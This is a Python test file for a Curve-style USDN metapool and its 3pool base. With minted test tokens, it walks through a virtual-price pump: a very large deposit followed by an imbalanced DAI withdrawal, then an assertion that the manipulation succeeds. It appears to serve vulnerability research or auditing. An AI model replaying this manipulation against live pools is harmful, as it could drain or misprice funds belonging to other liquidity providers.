import pytest


@pytest.mark.target_pool('usdn')
def test_pump_virtual_price(chain, alice, bob, swap, base_swap, _underlying_coins, _base_coins, set_fees,
                            base_pool_token):
    set_fees(4000000, 5 * 10**9, include_meta=True)

    # Deposit to 3pool
    balances = [base_swap.balances(i) for i in range(3)]
    _base_coins[0]._mint_for_testing(alice, 27_372_000 * 10**18 - balances[0])
    _base_coins[1]._mint_for_testing(alice, 80_838_000 * 10**6 - balances[1])
    _base_coins[2]._mint_for_testing(alice, 66_729_000 * 10**6 - balances[2])
    for coin in _base_coins:
        coin.approve(base_swap, 2**255, {'from': alice})
        coin.approve(base_swap, 2**255, {'from': bob})
    base_swap.add_liquidity([coin.balanceOf(alice) for coin in _base_coins], 0, {'from': alice})

    # Deposit to usdn pool
    _underlying_coins[0]._mint_for_testing(alice, 261_189_000 * 10**18)
    for coin in _underlying_coins:
        coin.approve(swap, 2**255, {'from': alice})
        coin.approve(swap, 2**255, {'from': bob})
    swap.add_liquidity([261_189_000 * 10**18, 87_063_000 * 10**18], 0, {'from': alice})

    # Step 1. Add liquidity to 3pool
    _base_coins[0]._mint_for_testing(bob, 5_890_932_000 * 10**18)
    _base_coins[1]._mint_for_testing(bob, 7_437_175 * 10**6)
    _base_coins[2]._mint_for_testing(bob, 7_505_352 * 10**6)
    base_swap.add_liquidity([coin.balanceOf(bob) for coin in _base_coins], 0, {'from': bob})

    # Step 2. Withdraw DAI to pump
    base_swap.remove_liquidity_imbalance([5_878_103_000 * 10**18, 0, 0], 2**255, {'from': bob})

    # If the assert fails - cannot hack!
    assert base_swap.get_virtual_price() > int(1.01e18)
